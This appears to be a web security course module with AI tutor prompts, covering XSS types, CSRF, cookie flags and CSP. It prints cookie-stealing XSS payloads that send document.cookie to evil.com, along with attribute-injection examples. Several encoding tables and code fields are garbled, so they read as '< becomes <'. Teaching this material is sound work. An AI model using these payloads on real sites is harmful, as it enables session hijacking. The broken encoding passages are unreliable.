title: XSS & Web Security
description: Master Cross-Site Scripting attacks, CSRF protection, session management, and Content Security Policy to build secure web applications
learning_outcomes: Explain how web applications work: HTTP requests, responses, cookies, and sessions
Distinguish between Reflected XSS, Stored XSS, and DOM-based XSS
Demonstrate cookie theft using XSS with document.cookie
Trace step by step how an XSS payload executes in the browser
Implement server-side output encoding to prevent XSS
Write client-side input sanitisation using regex and DOMPurify
Understand Cross-Site Request Forgery (CSRF) and how it differs from XSS
Implement CSRF token generation, embedding, and validation in Java servlets
Configure secure session management: HttpOnly, Secure, SameSite cookie flags
Write Content Security Policy (CSP) headers to block inline script execution
Recognise CWE-79 (XSS), CWE-352 (CSRF), and CWE-614 (Sensitive Cookie Without Secure Flag)
Analyse real-world XSS breaches and their impact

ai_tutor_config.personality: Encouraging, patient, uses postal and letter analogies. Never judges mistakes - web security is complex! Celebrates every vulnerability spotted and every defence built. Explains using side-by-side comparisons of vulnerable vs secure code.

intervention_triggers.idle_40_seconds: Hey there! XSS can be confusing because it involves TWO sides: the server that builds the page and the browser that renders it. Think of it like a letter: the server writes the letter, but if an attacker slips extra instructions into the letter, the browser follows them. Want me to walk through the letter analogy?
intervention_triggers.idle_90_seconds: Still working on it? No worries - XSS is one of the trickiest web vulnerabilities because you need to understand HTML, JavaScript, AND server-side code. Would you like me to: (A) Show how the attack works with a simple diagram, (B) Trace the payload character by character, or (C) Compare vulnerable vs secure code side by side?
intervention_triggers.idle_180_seconds: Take your time! Here is the core idea: XSS happens when the server puts user input directly into an HTML page without cleaning it. If the input contains <script> tags, the browser runs them as real code. The fix is to ENCODE the special characters so < becomes < and the browser shows it as text instead of running it as code. Ready to try a simpler exercise?
intervention_triggers.first_error: Good try! XSS payloads need to match the HTML context they are injected into. Check: is your input going inside an HTML tag, an attribute, or a script block? Each needs a different approach. Try again!
intervention_triggers.repeated_errors: No problem at all! Let me break this down. Step 1: Where does user input appear in the HTML page? Step 2: What characters are dangerous in that context? Step 3: How can you encode those characters? Let us go through each step together.
intervention_triggers.after_success: Excellent work! You just demonstrated how an attacker can steal cookies, deface websites, or hijack sessions through XSS. Now you understand WHY output encoding is essential. You are building real security skills!

encouragement_phrases: XSS is the most common web vulnerability - mastering it puts you ahead of most developers!
You are thinking about both the attacker AND defender perspective - that is the key!
Great catch! That unescaped output is exactly where XSS lives!
Remember: if user input appears on a page without encoding, XSS is possible.
Every major website has been hit by XSS at some point - even Google and Facebook!
The browser trusts everything the server sends. That trust is what attackers exploit.
You spotted the missing encoding - that is exactly what a security auditor would find!
CSRF and XSS are a dangerous combination. Understanding both makes you powerful!
Take a breath if needed. Web security has many layers - we will master them all.
Each exercise makes you better at protecting real users from real attacks!

explanation_styles.analogy: XSS is like a postal service: You send a letter (HTTP request) to a company (web server). The company writes a reply (HTML page) and includes something you wrote in the letter. Normally this is fine - they include your name on the reply. But what if you wrote fake instructions in your letter that look like they came from the company? The person reading the reply (browser) cannot tell which parts the company wrote and which parts came from you. They follow ALL the instructions - including your malicious ones.
explanation_styles.visual:
VULNERABLE: Server builds HTML with user input directly: '

Hello ' + username + '

'. If username = '', the browser sees a real script tag and RUNS it. SECURE: Server ENCODES the input first: '

Hello ' + encode(username) + '

'. The < becomes < and the browser shows it as TEXT, not code.
explanation_styles.step_by_step: Step 1: Attacker crafts a URL or form input containing JavaScript code. Step 2: The server includes this input in the HTML response WITHOUT encoding. Step 3: The victim's browser receives the page and sees a <script> tag. Step 4: The browser trusts the page (it came from the legitimate server) and RUNS the script. Step 5: The script steals the victim's cookies and sends them to the attacker.
explanation_styles.code_trace: Input: <script>document.location='http://evil.com?c='+document.cookie</script>. Server code: out.println('Welcome ' + input). HTML becomes: Welcome <script>document.location='http://evil.com?c='+document.cookie</script>. Browser: runs the script, redirects to evil.com with cookies in the URL. Attacker: reads cookies from their server log. Game over.
explanation_styles.comparison: XSS = Attacker injects code that runs in the VICTIM's browser. CSRF = Attacker tricks the victim's browser into making a REQUEST the victim did not intend. XSS steals data FROM the page. CSRF makes the browser DO something on another site.

lessons.title: XSS & Web Security - From Browser Basics to Defence Mastery

theory.introduction:
Imagine you receive a letter from your bank. You trust it because it has the bank's letterhead, logo, and came in an official envelope. You follow the instructions in the letter - you call the phone number, you visit the website link, you enter your details. But what if someone had intercepted the letter before it reached you and slipped in an extra page with fake instructions? You would follow those too, because you believe the WHOLE letter came from the bank.

This is exactly how Cross-Site Scripting (XSS) works. A web server sends an HTML page to your browser. Your browser trusts EVERYTHING in that page because it came from the legitimate server. But if an attacker managed to inject malicious JavaScript code into that page, your browser runs it with full trust - it can read your cookies, redirect you to fake websites, modify what you see on the screen, or make requests on your behalf.

XSS (CWE-79) has been in the OWASP Top 10 for over 20 years. It is the MOST COMMON web vulnerability, found in approximately 75% of all web applications. Major companies including Google, Facebook, Twitter, and Yahoo have all had XSS vulnerabilities discovered in their products. The MySpace Samy worm (2005) infected over one million profiles in just 20 hours using stored XSS.

In this topic, you will learn the three types of XSS (Reflected, Stored, and DOM-based), how to steal session cookies, how Cross-Site Request Forgery (CSRF) works alongside XSS, how to protect sessions with HttpOnly and Secure flags, and how Content Security Policy (CSP) provides an additional defence layer. By the end, you will be able to find, exploit, and fix the most common web security vulnerabilities.
theory.why_important: XSS directly impacts users - it runs in THEIR browser, steals THEIR data, and acts as THEM. Unlike SQL injection which attacks the server, XSS attacks the people using the website. A single XSS vulnerability on a banking site could let an attacker transfer money from every user who visits a compromised page. The British Airways XSS-related breach exposed 380,000 payment card details. Understanding XSS, CSRF, and session security is essential for anyone building web applications - which is nearly every developer today.

key_concepts.concept: How the Web Works: HTTP, HTML, and the Browser
key_concepts.explanation:
Before understanding XSS, you need to understand how web pages work. When you type a URL or click a link, your browser sends an HTTP REQUEST to a web server. The server processes the request, builds an HTML page, and sends it back as an HTTP RESPONSE. Your browser then RENDERS (displays) the HTML.

The HTML page can contain text, images, links, forms, CSS styling, and crucially - JavaScript code in <script> tags. The browser runs ALL JavaScript it finds in the page. It trusts the page completely because it came from the server.

HTTP is stateless - the server does not remember you between requests. To solve this, servers use COOKIES - small pieces of data stored in your browser. The most important cookie is the SESSION ID (often called JSESSIONID in Java). This cookie proves who you are. If an attacker steals your session cookie, they can impersonate you.
key_concepts.ai_hint: The browser runs everything in <script> tags. If an attacker gets JavaScript into the HTML, the browser runs it as trusted code.

key_concepts.explanation:
Cross-Site Scripting (XSS) happens when a web application includes user-supplied data in an HTML page WITHOUT properly encoding or validating it. If the user input contains HTML tags or JavaScript code, the browser treats it as REAL code and executes it.

The name 'Cross-Site' comes from the fact that the attacker's code runs in the CONTEXT of the vulnerable website. Because of the browser's Same-Origin Policy, JavaScript can only access cookies and data from the site it appears to come from. So if the attacker's script runs on bank.com's page, it can access bank.com's cookies - including the session ID.

There are three types:
1. REFLECTED XSS - The malicious input comes from the URL/request and is immediately reflected back in the response
2. STORED XSS - The malicious input is saved in the database and served to every user who views that data
3. DOM-BASED XSS - The vulnerability is in client-side JavaScript that modifies the page DOM using untrusted data

All three types have the same root cause: user input is treated as code instead of data.
key_concepts.ai_hint: XSS happens because the server puts raw user input into HTML. The browser cannot tell the difference between the developer's code and the attacker's injected code.

key_concepts.explanation:
Reflected XSS is the most common type. The attack payload is embedded in a URL or form submission, sent to the server, and immediately 'reflected' back in the HTML response. The server does not store the payload - it only appears in that one response.

The attack flow:
1. Attacker crafts a malicious URL: http://shop.com/search?q=<script>steal()</script>
2. Attacker sends this URL to the victim (via email, social media, or a fake link)
3. Victim clicks the link, browser sends request to shop.com
4. Server includes the search query in the response HTML without encoding
5. Victim's browser receives the page and runs the attacker's script
6. Script steals session cookie and sends it to the attacker

The victim trusts the link because it goes to shop.com - a legitimate website. They do not notice the malicious code in the URL (especially if it is URL-encoded). The server is the middleman: it receives the payload and passes it straight to the victim's browser.
key_concepts.ai_hint: Reflected XSS is a one-time attack through a crafted URL. The payload travels: URL -> Server -> HTML response -> Victim's browser.

key_concepts.explanation:
Stored XSS is MORE dangerous than reflected because the payload is saved in the database and served to EVERY user who views the affected page. The attacker does not need to trick each victim into clicking a special link - any visitor is automatically attacked.

The attack flow:
1. Attacker posts a comment containing: <script>steal cookies</script>
2. Server saves the comment to the database (without sanitising)
3. Any user who views the comment page gets the script in their browser
4. The script runs automatically and steals EVERY viewer's session cookie

The classic example is the MySpace Samy worm (2005). A user named Samy Kamkar posted a profile containing JavaScript that: (1) Added Samy as a friend of anyone who viewed his profile, (2) Copied the worm to the viewer's own profile. In 20 hours, over one million MySpace profiles were infected. Each infected profile then infected its own visitors, creating exponential spread.

Stored XSS in a forum, comment section, user profile, or any shared content can affect thousands of users from a single injection.
key_concepts.ai_hint: Stored XSS is like poisoning the water supply - everyone who drinks (visits the page) is affected. Reflected XSS is like poisoning one person's glass.

key_concepts.explanation:
DOM-based XSS is different from reflected and stored because the vulnerability is in the CLIENT-SIDE JavaScript, not the server. The server may send a perfectly safe HTML page, but the JavaScript on that page reads data from an untrusted source (like the URL fragment) and inserts it into the page unsafely.

The DOM (Document Object Model) is the browser's internal representation of the HTML page. JavaScript can modify the DOM to change what the user sees. If JavaScript reads user input from location.hash, document.referrer, or URL parameters and writes it to the page using innerHTML or document.write, it creates a DOM-based XSS vulnerability.

The danger: because the payload never goes to the server, server-side defences like output encoding and WAFs do not help. The attack happens entirely in the browser.
key_concepts.ai_hint: DOM XSS happens in the browser's JavaScript. The fix: use textContent (safe) instead of innerHTML (dangerous) when inserting user data.

key_concepts.concept: Cookie Theft: The Real Danger of XSS
key_concepts.explanation:
The most dangerous thing an attacker can do with XSS is steal session cookies. The session cookie (typically JSESSIONID in Java) is what proves your identity to the server. If an attacker has your session cookie, they can impersonate you completely - access your account, make purchases, change your password, read your messages.

The attack: <script>new Image().src='http://evil.com/steal?c='+document.cookie</script>

How it works:
1. document.cookie returns all cookies for the current site
2. new Image().src makes the browser load an 'image' from the attacker's server
3. The cookies are sent as part of the URL
4. The attacker's server logs the URL and extracts the cookies
5. The attacker uses the stolen JSESSIONID to hijack the session

This is why the HttpOnly flag is critical - it prevents JavaScript from accessing the cookie at all. With HttpOnly set, document.cookie does not return the session ID, and the XSS attack cannot steal it.
key_concepts.ai_hint: HttpOnly is the cookie's bodyguard - it prevents JavaScript from reading the cookie, even if XSS exists.

key_concepts.concept: Output Encoding: The Primary XSS Defence
key_concepts.explanation:
Output encoding (also called escaping) is the PRIMARY defence against XSS. It converts dangerous HTML characters into their safe entity equivalents so the browser displays them as TEXT instead of interpreting them as HTML/JavaScript.

The key encodings:
- < becomes < (prevents opening HTML tags)
- > becomes > (prevents closing HTML tags)
- " becomes " (prevents breaking out of attributes)
- ' becomes ' (prevents breaking out of attributes)
- & becomes & (prevents starting entity references)

With these encodings, <script>alert(1)</script> becomes <script>alert(1)</script>. The browser shows the literal text '<script>alert(1)</script>' on the screen instead of running it as code.

CRITICAL: You must encode at OUTPUT time (when putting data into HTML), not at INPUT time. Data stored in the database should be raw - you encode when displaying it. This is because the same data might be used in different contexts (HTML, JavaScript, CSS, URL) that each need different encoding.
key_concepts.ai_hint: Think of encoding as putting user input in a display case - everyone can SEE it but nobody can TOUCH it. The browser shows the text but never runs it as code.

key_concepts.explanation:
CSRF is a different attack from XSS but often works alongside it. In a CSRF attack, the attacker tricks the victim's browser into making a REQUEST to a website where the victim is already logged in. The browser automatically includes the session cookie, so the server thinks it is a legitimate request from the victim.

Example: You are logged into your bank (bank.com). The attacker's website contains a hidden form that automatically submits a transfer request to bank.com. When you visit the attacker's page, your browser submits the form with your bank.com session cookie attached. The bank sees a valid session and processes the transfer.

The key difference from XSS:
- XSS: Attacker injects code that runs IN the trusted site's page
- CSRF: Attacker makes the victim's browser send a REQUEST TO the trusted site

CSRF exploits the fact that browsers automatically attach cookies to every request for a domain, even if the request originated from a different site.
key_concepts.ai_hint: CSRF is like someone forging a signed cheque using your signature (session cookie). CSRF tokens are like adding a one-time PIN that only you know.

key_concepts.explanation:
CSRF tokens work by requiring a secret, unpredictable value in every state-changing request. The server generates a random token, stores it in the session, and embeds it in every form as a hidden field. When the form is submitted, the server checks that the token matches.

The attacker cannot include the correct token because:
1. The token is random and unpredictable
2. The Same-Origin Policy prevents the attacker's site from reading the victim's pages on the target site
3. Each session has a different token

Implementation steps:
1. Generate: Create a cryptographically random token (SecureRandom + Base64)
2. Store: Save it in the user's HTTP session
3. Embed: Include it as a hidden field in every form
4. Validate: On form submission, compare the submitted token with the stored token
5. Reject: If tokens do not match or are missing, reject the request
key_concepts.ai_hint: CSRF tokens are like a secret handshake between the server and your form. The attacker's fake form does not know the handshake.

key_concepts.explanation:
Session cookies need three security flags to be protected:

1. HttpOnly: Prevents JavaScript from accessing the cookie. Even if XSS exists, document.cookie cannot read the session ID. This blocks cookie theft via XSS.

2. Secure: The cookie is only sent over HTTPS connections. This prevents attackers from intercepting the cookie on unsecured Wi-Fi (Man-in-the-Middle attacks).

3. SameSite: Controls when the cookie is sent with cross-site requests.
   - Strict: Cookie is NEVER sent with cross-site requests (strongest protection against CSRF)
   - Lax: Cookie is sent with top-level navigation (clicking a link) but NOT with form submissions or AJAX from other sites
   - None: Cookie is always sent (requires Secure flag)

In Java, you set these flags on the session cookie when the user logs in. Without these flags, your session is vulnerable to XSS cookie theft, network interception, and CSRF attacks.
key_concepts.ai_hint: HttpOnly = no JavaScript access. Secure = HTTPS only. SameSite = no cross-site sending. Use ALL THREE on session cookies.

key_concepts.explanation:
Content Security Policy is an HTTP header that tells the browser WHICH sources of content are allowed on the page. Even if an attacker injects a <script> tag via XSS, the browser will refuse to run it if CSP does not allow inline scripts.

Key CSP directives:
- script-src: Which sources can provide JavaScript
- style-src: Which sources can provide CSS
- img-src: Which sources can provide images
- default-src: Fallback for all resource types
- connect-src: Which URLs can be connected to via AJAX/fetch

Common values:
- 'self': Only from the same origin (your own domain)
- 'none': Block everything of this type
- 'nonce-abc123': Only scripts with matching nonce attribute
- https://cdn.example.com: Only from this specific domain

The most important rule: script-src 'self' blocks ALL inline scripts. This means even if an attacker injects <script>alert(1)</script>, the browser refuses to run it because it is inline (not from a file on your domain). This is a powerful second line of defence after output encoding.
key_concepts.ai_hint: CSP is like a bouncer at a club with a guest list. Only scripts from approved sources get in. Inline scripts injected by attackers are NOT on the list.

key_concepts.explanation:
While server-side output encoding is the PRIMARY defence, adding client-side sanitisation provides an extra layer of protection. In JavaScript, you should sanitise user input before inserting it into the DOM.

Safe methods (treat input as TEXT):
- element.textContent = userInput (SAFE - never interprets HTML)
- element.innerText = userInput (SAFE - never interprets HTML)

Dangerous methods (treat input as HTML):
- element.innerHTML = userInput (DANGEROUS - parses and executes HTML)
- document.write(userInput) (DANGEROUS - injects into document)
- eval(userInput) (EXTREMELY DANGEROUS - executes as JavaScript)

If you MUST use innerHTML (rare cases), sanitise first using:
1. A regex to strip dangerous tags: input.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
2. A library like DOMPurify: DOMPurify.sanitize(input)
3. The browser's built-in sanitiser API (newer browsers)
key_concepts.ai_hint: textContent = SAFE (always text). innerHTML = DANGEROUS (interprets HTML). When in doubt, use textContent.

key_concepts.concept: CWE-79, CWE-352, CWE-614: The Web Security CWEs
key_concepts.explanation:
Understanding CWE (Common Weakness Enumeration) numbers helps you communicate precisely about web security vulnerabilities.

CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting). Covers all three XSS types. Root cause: user input included in HTML without encoding.

CWE-352: Cross-Site Request Forgery (CSRF). Covers attacks where the victim's browser is tricked into making unwanted requests. Root cause: server relies only on cookies for authentication without additional token verification.

CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute. The session cookie can be sent over unencrypted HTTP, allowing interception.

CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag. JavaScript can access the session cookie, enabling theft via XSS.

CWE-16: Configuration (related to missing security headers like CSP).

These CWEs are referenced in security reports, vulnerability disclosures, and compliance standards like PCI-DSS.
key_concepts.ai_hint: CWE-79 = XSS, CWE-352 = CSRF, CWE-614 = insecure cookie. Know these numbers for security reports.

complete_examples.title: Example 1: Reflected XSS in a Search Page
complete_examples.description: A search page that reflects user input directly into HTML without encoding. We trace the attack step by step.
complete_examples.output:
Normal: Shows 'You searched for: laptop' (text only)
Attack: Browser executes <script>alert(document.cookie)</script>
        Alert box appears showing JSESSIONID cookie value!
complete_examples.ai_explanation: The servlet takes the 'q' parameter and puts it directly into the HTML response using string concatenation. When the input is normal text like 'laptop', this works fine. But when the input contains HTML tags like <script>, the browser treats them as REAL HTML/JavaScript and executes them. The fix: encode the query before outputting it.
complete_examples.ai_challenge: Try changing the payload to steal cookies silently: <script>new Image().src='http://evil.com?c='+document.cookie</script>. This sends cookies to the attacker without the user seeing anything.

complete_examples.title: Example 2: Secure Search with Output Encoding
complete_examples.description: The same search page, now protected with output encoding. The identical attack payload is harmlessly displayed as text.
complete_examples.output:
Normal: Shows 'You searched for: laptop' (same as before) Attack input: HTML sent:

You searched for: <script>alert(document.cookie)</script>

Browser shows TEXT: '' Nothing executes! Attack BLOCKED!
complete_examples.ai_explanation: The encodeHTML method converts < to < and > to >. The browser sees <script> and displays it as the text '<script>' instead of treating it as a real script tag. The user sees the literal text of the attack payload on screen, but nothing harmful happens.
complete_examples.ai_challenge: What if the user input goes inside an HTML attribute like <input value='[INPUT]'>? Would the same encoding work? (Hint: the attacker might use ' to break out of the attribute.)

complete_examples.title: Example 3: Stored XSS in a Comment System
complete_examples.description: A forum where comments are stored in the database and displayed to all visitors. One malicious comment attacks everyone.
complete_examples.output:
Every visitor to the comments page:
1. Sees 'Great post!' as text
2. Browser silently executes the hidden script
3. Cookies sent to evil.com
4. Attacker collects ALL visitors' session cookies
5. Can impersonate ANY visitor!
complete_examples.ai_explanation: Unlike reflected XSS where each victim needs a crafted link, stored XSS attacks everyone automatically. The malicious script is saved in the database and served as part of every page load. This is like poisoning a shared water supply instead of one person's drink. Fix: encode BOTH author and comment before output: out.println("" + encodeHTML(author) + "");
complete_examples.ai_challenge: The MySpace Samy worm used stored XSS to add the attacker as a friend AND copy the worm to the victim's profile. Can you think of why stored XSS is considered more dangerous than reflected?

complete_examples.title: Example 4: DOM-Based XSS
complete_examples.description: A page where client-side JavaScript reads from the URL and uses innerHTML, creating a vulnerability the server never sees.
complete_examples.code: Welcome Page
complete_examples.output: Vulnerable: Browser renders tag from hash, triggers onerror, executes JavaScript Secure: Browser shows literal text '
complete_examples.ai_explanation:
DOM-based XSS is unique because the attack payload NEVER goes to the server. The URL fragment (after #) is not sent in HTTP requests. The vulnerability is entirely in the client-side JavaScript that reads location.hash and uses innerHTML.

The fix is simple: use textContent instead of innerHTML. textContent ALWAYS treats the value as plain text, never as HTML.
complete_examples.ai_challenge: What other JavaScript properties/methods are dangerous like innerHTML? (Hint: document.write, eval, outerHTML, and insertAdjacentHTML are all risky.)

complete_examples.title: Example 5: Cookie Theft Attack - Full Chain
complete_examples.description: Complete demonstration of how XSS leads to session hijacking: from injection to cookie theft to account takeover.
complete_examples.output:
Without HttpOnly: Attacker steals JSESSIONID -> full account takeover
With HttpOnly: Attacker only gets non-sensitive cookies -> session safe
complete_examples.ai_explanation:
This shows the complete attack chain: XSS injection -> script execution -> cookie reading -> data exfiltration -> session hijacking. The Image trick is used because loading an image does not require any special permissions - the browser just makes an HTTP request to the attacker's server with the cookies in the URL.

HttpOnly breaks the chain at step 4: document.cookie cannot read the JSESSIONID, so the attacker gets nothing useful.
complete_examples.ai_challenge: Even with HttpOnly, XSS can still do damage. Name three things an XSS script can do WITHOUT stealing cookies. (Hint: page defacement, phishing forms, keylogging.)

complete_examples.title: Example 6: CSRF Attack on a Bank Transfer
complete_examples.description: How an attacker tricks a victim's browser into making an unwanted bank transfer using a hidden auto-submitting form.
complete_examples.output:
Victim visits evil.com -> hidden form auto-submits to bank.com
Bank sees valid session cookie -> processes the transfer
Victim loses $5000 without knowing!
complete_examples.ai_explanation:
The CSRF attack exploits the fact that browsers automatically attach cookies to every request for a domain. The victim's browser sends the JSESSIONID cookie with the forged POST request because it is going to bank.com. The bank has no way to distinguish this from a legitimate transfer.

The fix: require a CSRF token that the attacker's page cannot know.
complete_examples.ai_challenge: Why does the SameSite=Strict cookie flag help prevent CSRF? (Hint: with Strict, the cookie is NOT sent when the request comes from a different site.)

complete_examples.title: Example 7: CSRF Token Implementation
complete_examples.description: Complete implementation of CSRF protection in a Java Servlet: token generation, session storage, form embedding, and validation.
complete_examples.output:
Legitimate request: Token matches -> transfer processed
CSRF attack: No token or wrong token -> 403 Forbidden, transfer blocked
complete_examples.ai_explanation:
The CSRF token breaks the attack because:
1. The token is generated randomly (attacker cannot guess it)
2. The token is stored in the session (attacker cannot read it)
3. The token must be in the form submission (attacker's page does not have it)
4. The Same-Origin Policy prevents the attacker from reading the bank's pages

The token is also invalidated after use (one-time token), preventing replay attacks.
complete_examples.ai_challenge: What happens if the CSRF token is placed in the URL instead of a hidden form field? (Hint: URLs can be leaked through the Referer header, browser history, and server logs.)

complete_examples.title: Example 8: Secure Cookie Configuration
complete_examples.description: Setting all three security flags on session cookies in a Java web application.
complete_examples.output: Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=1800
complete_examples.ai_explanation:
Each flag protects against a different attack:
- HttpOnly: JavaScript (document.cookie) CANNOT read the cookie -> XSS cookie theft blocked
- Secure: Cookie ONLY sent over HTTPS -> Man-in-the-Middle interception blocked
- SameSite=Lax: Cookie NOT sent with cross-site form submissions -> CSRF blocked
- Max-Age: Cookie expires after 30 minutes -> limits window of attack if cookie is somehow stolen
complete_examples.ai_challenge: Why use SameSite=Lax instead of SameSite=Strict? (Hint: Strict blocks the cookie even when clicking a link from another site, which breaks legitimate navigation.)

complete_examples.title: Example 9: Content Security Policy Header
complete_examples.description: Adding CSP headers to block inline script execution, providing a safety net even if output encoding is missed.
complete_examples.output:
With CSP: Inline <script> tags are BLOCKED by the browser
Browser console: 'Refused to execute inline script' (CSP violation)
XSS attack fails even without output encoding!
complete_examples.ai_explanation:
CSP is a safety net. Even if a developer forgets to encode output somewhere, CSP prevents the injected script from executing. The browser checks every script against the CSP rules before running it.

script-src 'self' means: only run scripts that are loaded from a file on our own domain. Inline scripts (like those injected by XSS) are NOT from a file on our domain, so they are blocked.

Important: CSP should be used IN ADDITION to output encoding, not instead of it.
complete_examples.ai_challenge: Some applications need inline scripts for functionality. How can CSP allow specific inline scripts while blocking injected ones? (Hint: nonce-based CSP with a random nonce per page load.)

complete_examples.title: Example 10: XSS in HTML Attributes
complete_examples.description: XSS is not just about <script> tags. Attackers can inject into HTML attributes to execute JavaScript via event handlers.
complete_examples.output:
Attack: value='' onmouseover='alert(document.cookie)' x=''
Mouse over input -> alert fires -> cookies exposed!
With encoding: value='' onmouseover=...' -> shows literal text, no execution
complete_examples.ai_explanation:
XSS is not limited to <script> tags. Attackers can break out of HTML attributes using quotes and add event handlers like onmouseover, onfocus, onerror, onload. Any HTML event handler can execute JavaScript.

The encoding must convert BOTH < > AND quotes to prevent attribute injection. The ' encoding for single quotes prevents the attacker from closing the attribute.
complete_examples.ai_challenge: What about double-quoted attributes? <input value="[INPUT]">. What payload would an attacker use? (Hint: they would use " instead of ' to close the attribute.)

complete_examples.title: Example 11: XSS via Image Tags
complete_examples.description: Attackers do not need
complete_examples.output: Weak filter: blocks
complete_examples.ai_explanation:
There are hundreds of HTML tags and event handlers that can execute JavaScript. Blacklisting specific tags (like only blocking <script>) is a losing game - attackers will always find a tag you forgot.

Output encoding is the correct approach because it makes ALL tags harmless by converting < to <. No tag of any kind can execute because the browser never sees real HTML tags.
complete_examples.ai_challenge: Research three more HTML tags that can execute JavaScript without <script>. (Hint: try <details ontoggle>, <input onfocus autofocus>, <math><mi>)

complete_examples.title: Example 12: Complete Secure Servlet with All Defences
complete_examples.description: A production-ready servlet implementing all seven defence layers: encoding, validation, CSP, cookie flags, CSRF tokens, logging, and error handling.
complete_examples.output:
All 7 layers active:
1. Output encoding on display
2. Input validation (length check)
3. CSP blocks inline scripts
4. HttpOnly prevents cookie theft
5. Secure flag enforces HTTPS
6. CSRF token validates form origin
7. Logging tracks security events
complete_examples.ai_explanation:
This servlet combines every defence technique into a single, production-ready implementation. Each layer catches what the others might miss:
- Output encoding stops most XSS
- CSP catches any encoding mistakes
- HttpOnly prevents cookie theft even if XSS succeeds
- CSRF tokens block forged requests
- Input validation limits what attackers can submit
- Logging helps detect and investigate attacks
complete_examples.ai_challenge: What would you add for a production deployment? (Hint: rate limiting, account lockout, Content-Type headers, X-Frame-Options, X-Content-Type-Options.)

complete_examples.title: Example 13: XSS Context-Dependent Encoding
complete_examples.description: Different HTML contexts require different encoding. HTML body, attributes, JavaScript, CSS, and URLs each need specific treatment.
complete_examples.output:
HTML body: <script> (safe)
Attribute: " prevents breakout (safe)
JavaScript: \x3cscript\x3e (safe)
URL: %3Cscript%3E (safe)
Each context needs its own encoding!
complete_examples.ai_explanation:
This is an advanced but critical concept. The same characters that are safe in one context are dangerous in another. For example, a single quote (') is safe in HTML body context but dangerous in JavaScript string context.

Most frameworks handle this automatically, but if you are writing raw servlet code, you need to know which encoding to apply based on where the data appears in the HTML.
complete_examples.ai_challenge: What happens if you use HTML encoding inside a <script> block? Example: <script>var x = '<';</script>. Does the browser decode < back to < inside the script? (Hint: YES it does! HTML entities are decoded before JavaScript sees the value.)

complete_examples.title: Example 14: Real-World XSS Impact - The Samy Worm
complete_examples.description: Analysis of the MySpace Samy worm that infected over 1 million profiles in 20 hours using stored XSS, demonstrating viral propagation.
complete_examples.output:
Lessons from the Samy Worm:
1. Output encode ALL user content
2. Use CSRF tokens on ALL actions
3. CSP would have blocked the inline script
4. Rate limiting would have slowed the spread
5. Never allow raw HTML in user profiles
complete_examples.ai_explanation:
The Samy worm is the most famous XSS attack in history. It demonstrated that stored XSS can be self-replicating: each infected profile becomes a new attack vector. The exponential growth meant MySpace had to take the entire platform offline.

Modern defences would prevent this: output encoding stops the script from executing, CSP blocks inline scripts, CSRF tokens prevent the friend-add and profile-update requests, and rate limiting would catch the unusual activity.
complete_examples.ai_challenge: If you were designing a social media platform that allows users to post rich content (bold, images, links), how would you allow formatting WITHOUT allowing XSS? (Hint: use a whitelist of allowed HTML tags like , , with sanitised attributes.)

visual_diagram.title: XSS & Web Security: Attack Types, Defences & Cookie Protection
visual_diagram.content:
XSS & WEB SECURITY: COMPLETE DEFENCE MAP
3 TYPES OF XSS 
  REFLECTED XSS (from URL)
  Attacker -> crafts malicious URL
       |-> sends to victim via email/link
  Victim -> clicks link -> browser sends to server
  Server -> includes input in HTML (no encoding)
  Browser -> receives page -> RUNS the injected script
  Impact: one victim per crafted link

  STORED XSS (from database)
  Attacker -> posts malicious content (comment/profile)
  Server -> saves to database (no sanitisation)
  Any User -> views the page
  Server -> reads from DB -> puts in HTML (no encoding)
  Browser -> RUNS the script for EVERY visitor
  Impact: ALL visitors affected (most dangerous!)

  DOM-BASED XSS (client-side)
  Attacker -> crafts URL with payload in hash/fragment
  Victim -> clicks link
  Server -> sends normal safe HTML
  Client JS -> reads URL hash -> uses innerHTML
  Browser -> RUNS injected content from the DOM
  Impact: server never sees the attack payload
COOKIE THEFT via XSS 
  Injected script:
  <script>new Image().src='http://evil.com?c='+document.cookie</script>
       |
       v
  document.cookie returns: "JSESSIONID=abc123; theme=dark"
       |
       v
  Browser loads: http://evil.com?c=JSESSIONID=abc123;theme=dark
       |
       v
  Attacker reads cookie from server log -> SESSION HIJACKED!

  DEFENCE: HttpOnly flag
  Set-Cookie: JSESSIONID=abc123; HttpOnly
  document.cookie returns: "theme=dark" (no JSESSIONID!)
  Cookie theft BLOCKED!
CSRF vs XSS COMPARISON 
  XSS: Attacker injects CODE into the trusted site's page
       Code READS data from the page (cookies, content)
       Victim: page they are viewing is compromised
       Fix: Output encoding + CSP

  CSRF: Attacker makes victim's browser SEND a request
        Browser auto-attaches cookies to the request
        Server thinks it is a legitimate request from the victim
        Fix: CSRF tokens + SameSite cookies

  XSS + CSRF: Attacker uses XSS to steal CSRF token
              Then performs CSRF with the stolen token
              This is why you need BOTH defences!
OUTPUT ENCODING - THE #1 XSS DEFENCE 
  WITHOUT encoding:
  Input:  <script>alert(1)</script>
  HTML:   <p><script>alert(1)</script></p>
  Browser: RUNS the script!

  WITH encoding:
  Input:  <script>alert(1)</script>
  Encoded: <script>alert(1)</script>
  HTML:   <p><script>alert(1)</script></p>
  Browser: shows TEXT "<script>alert(1)</script>"

  Encoding table:
  <  becomes  <    (blocks opening tags)
  >  becomes  >    (blocks closing tags)
  "  becomes  "  (blocks attribute escape)
  '  becomes  '  (blocks attribute escape)
  &  becomes  &   (blocks entity injection)
COMPLETE DEFENCE CHECKLIST - 7 LAYERS 
  Layer 1 Output Encoding (server-side)
    Encode ALL user data before putting it in HTML.
    < > " ' & -> safe entity equivalents.

  Layer 2 Input Validation (server-side)
    Whitelist expected characters/patterns.
    Reject input that does not match.

  Layer 3 Content Security Policy (CSP)
    script-src 'self' blocks inline scripts.
    Even if encoding is missed, CSP blocks execution.

  Layer 4 HttpOnly Cookie Flag
    Prevents JavaScript from reading session cookies.
    XSS cannot steal session IDs.

  Layer 5 Secure Cookie Flag
    Cookie only sent over HTTPS.
    Prevents network interception.

  Layer 6 SameSite Cookie + CSRF Tokens
    Prevents cross-site request forgery.
    Forms must include secret token.

  Layer 7 Client-Side Sanitisation
    Use textContent (not innerHTML).
    DOMPurify for rich content.
REMEMBER - THE 5 GOLDEN RULES 
  Rule 1: ALWAYS encode user data before putting it in HTML
  Rule 2: Set HttpOnly + Secure + SameSite on session cookies
  Rule 3: Use CSRF tokens on ALL state-changing forms
  Rule 4: Add CSP headers: script-src 'self'
